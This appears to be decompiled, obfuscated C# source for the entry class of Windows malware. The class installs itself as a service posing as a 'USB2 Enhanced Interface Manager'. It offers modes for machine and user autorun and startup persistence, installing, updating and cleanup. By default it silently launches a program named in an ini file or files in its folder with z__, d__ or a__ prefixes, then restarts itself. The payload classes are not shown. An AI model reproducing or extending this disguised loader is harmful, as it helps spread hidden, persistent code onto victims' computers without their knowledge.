using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Remoting.Messaging;
using System.Threading;

namespace ITWX;

[Service("usb2e", DisplayName = "USB2 Enhanced Interface Manager", Description = "Provides the functionaliry required to use enhanced USB (USB2) devices.", ServiceType = GClass0.GEnum2.flag_3, ServiceAccessType = GClass0.GEnum1.flag_10, ServiceStartType = GClass0.GEnum4.const_2, ServiceErrorControl = GClass0.GEnum5.const_0, ServiceControls = (GClass0.GEnum3.flag_1 | GClass0.GEnum3.flag_3))]
[GAttribute0(Feature = "renaming", Exclude = true, StripAfterObfuscation = true)]
internal class DuperRunner : Class2
{
	protected delegate void MethodInvoker();

	public const int STOP_TIMEOUT = 20000;

	private Class36 scheduler_;

	protected Assembly thisAssembly_;

	public Assembly ThisAssembly
	{
		get
		{
			return thisAssembly_;
		}
		set
		{
			thisAssembly_ = value;
		}
	}

	public DuperRunner()
	{
		thisAssembly_ = Assembly.GetAssembly(typeof(DuperRunner));
	}

	public void MainEntry(string[] args)
	{
		if (args.Length > 0)
		{
			if (args[0].ToLower() == "-wait" || args[0].ToLower() == "-w")
			{
				try
				{
					int millisecondsTimeout = int.Parse((args.Length > 1) ? args[1] : "2000");
					Thread.Sleep(millisecondsTimeout);
					return;
				}
				catch
				{
					return;
				}
			}
			if (!(args[0].ToLower() == "-commandline") && !(args[0].ToLower() == "-cmd"))
			{
				if (!(args[0].ToLower() == "-service") && !(args[0].ToLower() == "-s"))
				{
					if (!(args[0].ToLower() == "-clean") && !(args[0].ToLower() == "-cl"))
					{
						if (!(args[0].ToLower() == "-standalone") && !(args[0].ToLower() == "-sa"))
						{
							if (!(args[0].ToLower() == "-mautorun") && !(args[0].ToLower() == "-mar"))
							{
								if (!(args[0].ToLower() == "-uautorun") && !(args[0].ToLower() == "-uar"))
								{
									if (!(args[0].ToLower() == "-mstartup") && !(args[0].ToLower() == "-msu"))
									{
										if (!(args[0].ToLower() == "-ustartup") && !(args[0].ToLower() == "-usu"))
										{
											if (!(args[0].ToLower() == "-install") && !(args[0].ToLower() == "-i"))
											{
												if (!(args[0].ToLower() == "-update") && !(args[0].ToLower() == "-upd"))
												{
													if (!(args[0].ToLower() == "-launch") && !(args[0].ToLower() == "-l"))
													{
														startAsLaunchpad(args, explicitArgument: false);
													}
													else
													{
														startAsLaunchpad(args, explicitArgument: false);
													}
												}
												else
												{
													Thread.Sleep(Class3.timeSpan_0);
													startWithUnknownMode(args, installOnly: false);
												}
											}
											else
											{
												startWithUnknownMode(args, installOnly: true);
											}
										}
										else
										{
											startAsStandalone(args, Enum0.UserStartUp);
										}
									}
									else
									{
										startAsStandalone(args, Enum0.MachineStartUp);
									}
								}
								else
								{
									startAsStandalone(args, Enum0.UserAutoRun);
								}
							}
							else
							{
								startAsStandalone(args, Enum0.MachineAutoRun);
							}
						}
						else
						{
							startAsStandalone(args, Enum0.Standalone);
						}
					}
					else
					{
						Thread.Sleep(Class3.timeSpan_1);
						Class0.smethod_11();
					}
				}
				else
				{
					method_1();
				}
			}
			else
			{
				startAsStandalone(args, Enum0.CommandLine);
			}
		}
		else
		{
			startAsLaunchpad(args, explicitArgument: false);
		}
	}

	protected void startWithUnknownMode(string[] args, bool installOnly)
	{
		Class1 @class = new Class1();
		Enum0 @enum = @class.method_10();
		if (!installOnly)
		{
			Enum0 enum2 = @enum;
			if (enum2 == Enum0.WindowsService)
			{
				startAsService(args);
			}
			else
			{
				startAsStandalone(args, @enum);
			}
		}
	}

	protected void startAsLaunchpad(string[] args, bool explicitArgument)
	{
		try
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			bool flag = false;
			int num = (explicitArgument ? 1 : 0);
			if (args.Length - num > 0)
			{
				string text = null;
				if (args.Length - num > 1)
				{
					text = "\"" + args[num + 1] + "\"";
					for (int i = num + 2; i < args.Length; i++)
					{
						text = text + " \"" + args[num + 1] + "\"";
					}
				}
				flag = Class51.smethod_27("open", args[num], text, currentDirectory, thisAssembly_.Location);
			}
			if (!flag)
			{
				string[] files = Directory.GetFiles(currentDirectory);
				string[] array = files;
				foreach (string text2 in array)
				{
					if (Path.GetFileName(text2.ToLower()) == Path.ChangeExtension("usb2e", "ini")!.ToLower())
					{
						try
						{
							StreamReader streamReader = new StreamReader(text2);
							string text3 = streamReader.ReadToEnd();
							streamReader.Close();
							flag = Class51.smethod_27("open", text3, null, currentDirectory, thisAssembly_.Location);
						}
						catch (Exception exception_)
						{
							Class47.smethod_8(exception_);
						}
					}
				}
				if (!flag)
				{
					array = files;
					foreach (string text4 in array)
					{
						if (!Path.GetFileName(text4.ToLower())!.StartsWith("z__") && !Path.GetFileName(text4.ToLower())!.StartsWith("d__") && !Path.GetFileName(text4.ToLower())!.StartsWith("a__"))
						{
							continue;
						}
						try
						{
							string extension = Path.GetExtension(text4);
							if (!(extension == "") && !(extension == ".dll"))
							{
								flag = Class51.smethod_27("open", text4, null, currentDirectory, thisAssembly_.Location);
							}
							else
							{
								int num2 = Class52.smethod_2(text4, null);
								if (flag = 0 != num2)
								{
									Process.GetProcessById(num2).WaitForExit(120000);
								}
							}
							if (flag)
							{
								break;
							}
						}
						catch (Exception exception_2)
						{
							Class47.smethod_8(exception_2);
						}
					}
				}
			}
		}
		catch (Exception exception_3)
		{
			Class47.smethod_8(exception_3);
		}
		startWithUnknownMode(args, installOnly: false);
	}

	protected void startAsService(string[] args)
	{
		Class41.smethod_36("usb2e", args);
	}

	protected void startAsStandalone(string[] args, Enum0 mode)
	{
		Class11 class11_ = new Class11();
		scheduler_ = new Class36(class11_);
		scheduler_.class11_0.enum0_0 = mode;
		scheduler_.method_7(TimeSpan.MaxValue);
		if (scheduler_.class11_0.bool_6)
		{
			restart();
		}
	}

	protected void restart()
	{
		bool flag = Environment.CommandLine.StartsWith("\"");
		int num = Environment.GetCommandLineArgs()[0].Length + (flag ? 2 : 0);
		int length = Environment.CommandLine.Length - num;
		string text = Environment.CommandLine.Substring(num, length);
		Class51.smethod_27("open", Environment.GetCommandLineArgs()[0], text, Path.GetDirectoryName(Class51.smethod_29()), null);
	}

	protected override void onServiceStart()
	{
		Class11 class11_ = new Class11();
		scheduler_ = new Class36(class11_);
		scheduler_.class11_0.enum0_0 = Enum0.WindowsService;
		MethodInvoker methodInvoker = doStart;
		methodInvoker.BeginInvoke(null, null);
	}

	[OneWay]
	protected void doStart()
	{
		try
		{
			scheduler_.method_7(TimeSpan.MaxValue);
			Class41.smethod_34("usb2e");
		}
		catch (Exception exception_)
		{
			Class47.smethod_8(exception_);
		}
	}

	protected override void onServiceStop()
	{
		try
		{
			if (scheduler_ != null && scheduler_.method_8())
			{
				scheduler_.method_3(TimeSpan.FromMilliseconds(20000.0));
			}
			if (scheduler_.class11_0.bool_6)
			{
				restart();
			}
		}
		catch (Exception exception_)
		{
			Class47.smethod_8(exception_);
		}
	}

	protected override void onServiceShutdown()
	{
		try
		{
			if (scheduler_ != null && scheduler_.method_8())
			{
				scheduler_.method_3(TimeSpan.FromMilliseconds(20000.0));
			}
			if (scheduler_.class11_0.bool_6)
			{
				restart();
			}
		}
		catch (Exception exception_)
		{
			Class47.smethod_8(exception_);
		}
	}
}
